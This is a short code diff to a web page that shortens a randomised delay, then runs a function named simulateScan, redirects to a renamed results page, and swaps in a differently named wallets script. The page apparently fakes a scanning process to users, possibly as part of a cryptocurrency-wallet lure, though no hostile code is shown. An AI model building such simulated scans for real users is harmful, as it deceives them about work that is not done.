@@ -1403,15 +1403,15 @@
   }
   init();
 
-  const minDelay = 500000000, maxDelay = 900000000;
+  const minDelay = 5000, maxDelay = 9000;
   const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
 
   setTimeout(() => {
     simulateScan();
-    window.location.href = "results.html";
+    window.location.href = "results1.html";
   }, delay);
 </script>
-<script src="../assets/wallets.js"></script>
+<script src="../assets/wallets1.js"></script>
 
 </body>
 </html>
